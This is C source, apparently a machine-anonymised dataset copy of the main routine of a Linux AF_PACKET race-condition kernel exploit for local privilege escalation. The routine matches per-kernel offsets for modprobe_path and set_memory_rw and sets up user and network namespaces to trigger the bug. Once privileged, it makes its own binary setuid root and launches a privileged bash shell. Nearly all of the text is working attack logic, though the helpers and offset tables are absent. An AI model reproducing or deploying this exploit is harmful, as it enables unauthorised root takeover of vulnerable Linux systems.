
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;




typedef struct TYPE_3__ TYPE_1__ ;


struct utsname {char* version; char* release; } ;
struct TYPE_3__ {char* kernel_version; scalar_t__ proc_dostring; int set_memory_rw; scalar_t__ register_sysctl_table; scalar_t__ modprobe_path; } ;


 int VAR_0 ;
 int VAR_1 ;
 int FUNC_0 (char*,int) ;
 int FUNC_1 (char*,int ,int ) ;
 int FUNC_2 (char*,char*,char*,int *) ;
 int FUNC_3 (int) ;
 int FUNC_4 () ;
 int FUNC_5 (int ,char*) ;
 scalar_t__ FUNC_6 () ;
 scalar_t__ FUNC_7 () ;
 int FUNC_8 () ;
 TYPE_1__* VAR_2 ;
 TYPE_1__* VAR_3 ;
 int FUNC_9 (char*,void*) ;
 int FUNC_10 (int ,int ,int ) ;
 int FUNC_11 (int ,int ,int ) ;
 int FUNC_12 (char*,int,char*,char*,char*) ;
 int VAR_4 ;
 int FUNC_13 (char*,char*) ;
 char* FUNC_14 (char*,char*) ;
 int FUNC_15 (struct utsname*) ;
 scalar_t__ FUNC_16 (int ) ;
 int FUNC_17 (int,int*,int ) ;
 int FUNC_18 () ;

int FUNC_19(int VAR_5, char **VAR_6)
{
    int VAR_7, VAR_8;
    struct utsname VAR_9;
    int VAR_10, VAR_11 = 0;
    char VAR_12[512], *VAR_13;


    if(VAR_5 == 2 && !FUNC_13(VAR_6[1],"crash")) {
        VAR_11 = 1;
    }


    if(FUNC_7() == 0 && FUNC_6() == 0 && !VAR_11) {
        FUNC_1("/proc/self/exe",0,0);
        FUNC_0("/proc/self/exe",06755);
        FUNC_3(-1);
    }

    else if(FUNC_7() != 0 && FUNC_6() == 0 && !VAR_11) {
        FUNC_11(0,0,0);
        FUNC_10(0,0,0);
        FUNC_2("/bin/bash","bash","-p",((void*)0));
        FUNC_3(0);
    }

    FUNC_5(VAR_4,"linux AF_PACKET race condition exploit by rebel\n");

    FUNC_15(&VAR_9);

    if((VAR_13 = FUNC_14(VAR_9.version,"-Ubuntu")) != ((void*)0)) *VAR_13 = '\0';

    FUNC_12(VAR_12,512,"%s %s",VAR_9.release,VAR_9.version);

    FUNC_9("kernel version: %s\n",VAR_12);


    for(VAR_10=0; VAR_3[VAR_10].kernel_version != ((void*)0); VAR_10++) {
        if(!FUNC_13(VAR_3[VAR_10].kernel_version,VAR_12)) {

            while(VAR_3[VAR_10].proc_dostring == 0)
                VAR_10--;

            VAR_2 = &VAR_3[VAR_10];
            break;
        }
    }

    if(VAR_11) {
        VAR_2 = &VAR_3[0];
        VAR_2->set_memory_rw = 0xffffffff41414141;
    }

    if(VAR_2) {
        FUNC_9("proc_dostring = %p\n",(void *)VAR_2->proc_dostring);
        FUNC_9("modprobe_path = %p\n",(void *)VAR_2->modprobe_path);
        FUNC_9("register_sysctl_table = %p\n",(void *)VAR_2->register_sysctl_table);
        FUNC_9("set_memory_rw = %p\n",(void *)VAR_2->set_memory_rw);
    }

    if(!VAR_2) {
        FUNC_5(VAR_4,"i have no offsets for this kernel version..\n");
        FUNC_3(-1);
    }

    VAR_8 = FUNC_4();

    if(VAR_8 == 0) {
        if(FUNC_16(VAR_1) != 0)
            FUNC_5(VAR_4, "failed to create new user namespace\n");

        if(FUNC_16(VAR_0) != 0)
            FUNC_5(VAR_4, "failed to create new network namespace\n");

        FUNC_18();
        FUNC_3(0);
    }

    FUNC_17(VAR_8, &VAR_7, 0);

    FUNC_8();
    return 0;
}
